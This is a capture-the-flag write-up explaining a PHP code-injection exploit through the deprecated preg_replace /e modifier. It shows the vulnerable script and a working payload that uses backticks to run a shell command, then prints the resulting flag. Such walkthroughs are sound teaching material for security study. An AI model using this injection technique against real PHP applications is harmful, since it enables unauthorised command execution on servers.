
# Injection via /e modifier 
This level confronts us with PHP, we will Exploit a vulnerability on the ***/e modifier***.
The source code of the executable :

```php
#!/usr/bin/php
<?php
function y($m)
{
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z)
{
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

Two functions are present, two arguments are passed in parameters, for my part I did not have to use a second arg, nor the logic of the function `y` except the return.

Therefore we will put all the attention on this line :
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

<u> Important : </ul>

 1. `/(\[x (.*)\])/e`: This is a pattern in the form of `[x ...]` where `...` can be any characters. The pattern captures everything between `[x` and `]`. The `/e` at the end means the replacement will be treated as PHP code.
 2. `"y(\"\\2\")"`: This is what replaces the matched pattern. It calls a function `y()` with the second content captured in the pattern as an argument. The point 2  refers to the content captured by the second capture group in 
the regular expression. In the pattern of the regular expression, the second capture group corresponds to `(.*)`, which captures any sequence of characters.
 3. `$a`: This is the **\$subject** string.

<u> I’ll let you check : </ul> 

[https://www.php.net/manual/en/function.preg-replace.php](https://www.php.net/manual/en/function.preg-replace.php)
[https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier)

Now that you understand that the modifier e allows you to inject code into the program, the goal will be to match the **\$pattern** so that a function is evaluated at the time of the **\$replacement**.

Create a **`/tmp/evalphp`**.

In PHP, braces allow you to evaluate PHP code, and backticks are used to encapsulate a shell command or statement that must be executed by the operating system.

```bash
ALotOfVuln [x {${`getflag`}}]
# OR
ALotOfVuln [x {${`getflag > /tmp/flag.txt`}}]
```

![enter image description here](https://i.imgur.com/5qihi81.png)

> Flag : wiok45aaoguiboiki2tuin6ub
